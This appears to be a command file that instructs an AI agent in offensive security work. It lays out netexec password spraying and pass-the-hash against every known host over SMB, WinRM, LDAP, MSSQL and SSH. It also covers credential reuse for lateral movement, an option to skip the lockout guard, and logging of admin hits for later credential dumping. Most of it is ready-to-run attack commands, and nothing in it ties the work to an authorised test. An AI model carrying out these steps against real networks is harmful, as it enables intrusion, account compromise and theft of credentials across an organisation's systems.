Spray every captured credential against every known host, across all protocols, and log the hits. $ARGUMENTS = optional flags: --proto smb,winrm,ldap,mssql,ssh (default all), --host <IP> (limit to one target), --no-lockout (skip the lockout guard).

## Step 0: Lockout safety (AD only — check first)
```bash
# If you have any domain foothold, read the policy before spraying passwords:
netexec smb <DC_IP> -u <known_user> -p <known_pass> --pass-pol 2>/dev/null
```
If lockout threshold is low (<5) — spray ONE password across many users, then WAIT
the observation window before the next. Never loop many passwords per account.

## Step 1: Load state (token-efficient)
```bash
# Unique credentials
jq -r '[.[] | {u:.username, p:.password, h:(.hash // ""), d:(.realm // .domain // "")}] | unique[] | "\(.d)\t\(.u)\t\(.p)\t\(.h)"' \
  ~/osai/current/state/creds.json 2>/dev/null

# Known hosts + their open ports
cat ~/osai/current/state/network_map.md 2>/dev/null
```

## Step 2: Build credential + user files
```bash
mkdir -p ~/osai/current/loot
jq -r '.[].username' ~/osai/current/state/creds.json | sort -u > ~/osai/current/loot/users.txt
jq -r '.[].password | select(. != null)' ~/osai/current/state/creds.json | sort -u > ~/osai/current/loot/passwords.txt
echo "Users: $(wc -l < ~/osai/current/loot/users.txt)  Passwords: $(wc -l < ~/osai/current/loot/passwords.txt)"
```

## Step 3: Spray per protocol (netexec)
Match each protocol to hosts that have the port open in network_map. Use
`--continue-on-success` so one working cred doesn't stop the sweep.

**SMB (445):**
```bash
# Password spray
netexec smb <TARGETS> -u ~/osai/current/loot/users.txt -p ~/osai/current/loot/passwords.txt --continue-on-success
# Pass-the-hash (for NTLM hashes in the vault)
netexec smb <TARGETS> -u <USER> -H <NTLM_HASH> --continue-on-success
```
`(Pwn3d!)` in output = local admin. Note it and jump to /osai-cred-vault + dump.

**WinRM (5985/5986):**
```bash
netexec winrm <TARGETS> -u ~/osai/current/loot/users.txt -p ~/osai/current/loot/passwords.txt --continue-on-success
```

**LDAP (389) — validates domain creds, low lockout risk with -k:**
```bash
netexec ldap <DC_IP> -u ~/osai/current/loot/users.txt -p ~/osai/current/loot/passwords.txt --continue-on-success
```

**MSSQL (1433):**
```bash
netexec mssql <TARGETS> -u ~/osai/current/loot/users.txt -p ~/osai/current/loot/passwords.txt --continue-on-success
# Windows-auth vs SQL-auth: add --local-auth for SQL logins
```

**SSH (22) — Linux hosts:**
```bash
netexec ssh <TARGETS> -u ~/osai/current/loot/users.txt -p ~/osai/current/loot/passwords.txt --continue-on-success
```

## Step 4: Credential reuse insight
- Domain creds → try against EVERY Windows host (SMB/WinRM/MSSQL), not just where found
- Local admin hash → try PTH against every host (shared local-admin = instant lateral)
- Any SSH/service password → try as the DA/administrator password on Windows (reuse is rampant)

## Step 5: Log every hit
For each successful `(Pwn3d!)` or valid-login line, record via cred-vault so the
access is tracked and deduplicated:
```
/osai-cred-vault --add --host <IP> --user <U> --secret <P> --realm <DOMAIN> --type <plain|ntlm> --source spray
```
Then update the target's row in ~/osai/current/state/network_map.md with the access
level gained (e.g. "SMB Pwn3d! as CORP\svc_sql").

## Step 6: Summary
```
=== SPRAY RESULTS ===
CREDS TESTED: N   HOSTS: M   PROTOCOLS: <list>
NEW ACCESS:
  <IP>  SMB    Pwn3d!  CORP\Administrator (PTH)
  <IP>  WinRM  valid   CORP\jsmith
NEXT: dump creds on Pwn3d! hosts → /osai-cred-vault ; check /osai-cred-vault --query before further attacks
```

## Token discipline
- Never paste full netexec output — grep for `+`, `Pwn3d!`, and valid-login lines only
- Spray is noisy: run it, harvest hits, log them, move on — don't re-run blindly
